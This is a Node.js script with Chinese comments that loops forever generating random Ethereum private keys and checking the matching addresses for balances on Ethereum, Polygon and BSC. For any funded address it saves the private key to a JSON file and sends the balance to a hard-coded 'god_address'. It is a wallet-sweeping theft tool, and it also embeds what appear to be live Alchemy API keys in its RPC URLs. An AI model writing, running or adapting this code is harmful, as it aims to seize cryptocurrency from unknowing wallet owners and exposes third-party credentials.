const { ethers } = require("ethers");
const _ = require("lodash");
const fs = require("fs");

const god_address = "0x604333a256Fe9bd948a71afff59bF056001eFC8B";

const chain_list = [
  {
    label: "eth",
    provide: new ethers.providers.JsonRpcProvider(
      "https://eth-mainnet.g.alchemy.com/v2/-5IsUaEFcfbReg9vt5P8bdao0W0uK3sN"
    ),
  },
  // {
  //   label: "goerli",
  //   provide: new ethers.providers.JsonRpcProvider(
  //     "https://eth-goerli.g.alchemy.com/v2/drOwZjLogvbvOsFjrqi-s6V9DJyuumSZ"
  //   ),
  // },
  {
    label: "polygon",
    provide: new ethers.providers.JsonRpcProvider(
      "https://polygon-mumbai.g.alchemy.com/v2/Gd_K-PgxidV-ArTJ0hwTg1wLC1jxYWSu"
    ),
  },
  {
    label: "bsc",
    provide: new ethers.providers.JsonRpcProvider(
      "https://data-seed-prebsc-1-s2.binance.org:8545"
    ),
  },
];

// 查询一下账号余额
const getBalance = async (wallet, privateKey) => {
  // 返回的余额单位是ether，要转换成ETH
  const _balance1 = await wallet.getBalance();
  const eth_balance = ethers.utils.formatEther(_balance1);

  // if(eth_balance > 0.001) {
  //   await transfer(wallet, myAddress, (eth_balance - 0.001).toFixed(5))
  // }
  return eth_balance;
};

// 生成随机的以太坊地址
function generateAddress() {
  const wallet = ethers.Wallet.createRandom();
  return wallet;
  // privateKey
}

// 转账
const transfer = async (wallet, to, eth) => {
  const value = ethers.utils.parseEther(eth);
  const result = await wallet.sendTransaction({
    to,
    value,
  });
  console.log(`成功转账: ${value} (ETH/match/bnb)`);
};

const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

async function main() {
  const fileUrl = "./result.json";

  // // 读取 JSON 文件
  // const data = fs.readFileSync(fileUrl);
  // // 将文件数据解析为 JSON 数组
  // let account_balance_list = JSON.parse(data);

  let account_balance_list = []

  while (true) {
    const walletObj = ethers.Wallet.createRandom();
    let { address, privateKey } = walletObj;

    console.log(`嗅探地址: ${address} :`);
    for (var k = 0; k < _.size(chain_list); k++) {
      const chain_item = chain_list[k];
      const wallet_with_provider = walletObj.connect(chain_item.provide);
      const balance = await getBalance(wallet_with_provider, privateKey);
      console.log(`\t -  ${chain_item.label}: ${balance}`);

      if (balance > 0) {
        // 将更新后的 JSON 数组写回文件
        account_balance_list.push({
          chainName: chain_item.label,
          privateKey,
          address,
          balance: +balance
        });
        fs.writeFileSync(fileUrl, JSON.stringify(_.orderBy(account_balance_list, ['balance'], ['desc']), null, 2));

        if (balance > 0.001) {
          await transfer(walletObj, god_address, (balance - 0.001).toFixed(5));
        }
        // 此处还可添加第三方消息推送
      }
      // 可设置休眠时间 防止api请求频率限制
      // await sleep(100);
    }
  }
}

main();
